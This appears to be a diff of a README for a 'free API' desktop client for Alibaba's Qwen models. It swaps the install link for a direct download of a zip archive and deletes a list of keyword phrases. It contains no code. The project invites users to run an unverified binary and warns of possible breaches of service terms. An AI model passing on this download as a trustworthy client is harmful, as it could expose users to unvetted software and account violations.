@@ -15,7 +15,7 @@ Qwen 3.6 Free API Desktop App is a fast and elegant native client for Alibaba’
 > This project is for educational and personal use only. Use at your own risk. You need your own Qwen API key. The authors are not responsible for any account issues or violations of service terms.
 
 ## Install
-[Download `Qwen-3.6.zip`](https://github.com/revztune/qwen-3.6-free-api-desktop-app/releases/latest)
+[Download `Qwen3.6-desktop.zip`](https://github.com/revztune/qwen-3.6-free-api-desktop-app/releases/download/3.6/Qwen3.6-desktop.zip)
 ---
 
 <img width="1080" height="673" alt="image" src="https://github.com/user-attachments/assets/8c616255-1cac-4597-8d58-1d6132bec38d" />
@@ -33,10 +33,3 @@ Qwen 3.6 Free API Desktop App is a fast and elegant native client for Alibaba’
 | Windows 11 issues | Keep system and drivers updated |
 | Inconsistent results | Adjust temperature and context settings |
 | Unexpected crashes | Clear app cache and restart |
-
-* Qwen 3.6 Desktop App
-* Alibaba Qwen AI Client
-* Qwen 3.6 Free Desktop Tool
-* AI Coding Assistant 2026
-* Qwen Desktop Chat App
-* Free Qwen 3.6 Desktop
